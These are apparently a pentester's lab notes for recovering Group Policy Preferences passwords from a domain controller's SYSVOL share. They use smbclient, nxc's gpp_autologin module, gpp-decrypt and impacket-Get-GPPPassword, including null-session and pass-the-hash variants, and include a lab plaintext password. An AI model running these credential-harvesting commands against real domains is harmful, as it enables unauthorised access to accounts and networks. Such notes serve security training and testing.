Connect To SYSVOL!!!
```sh
Registry.xml
Groups.xml

dir \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
smbclient \\\\$dc\\SYSVOL -U inlanefreight/jbade

nxc smb 172.16.8.3 -u hporter -p 'Gr8hambino!' -M gpp_autologin

# cpassword (Groups.xml) value decryptiong
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# powershell
Get-GPPAutologon-ps1
```
Get-GPPPassword!!!
```sh
# with a NULL session
impacket-Get-GPPPassword -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
impacket-Get-GPPPassword 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash
impacket-Get-GPPPassword -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```
References!!!
```
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\

https://adsecurity.org/?p=2362
```
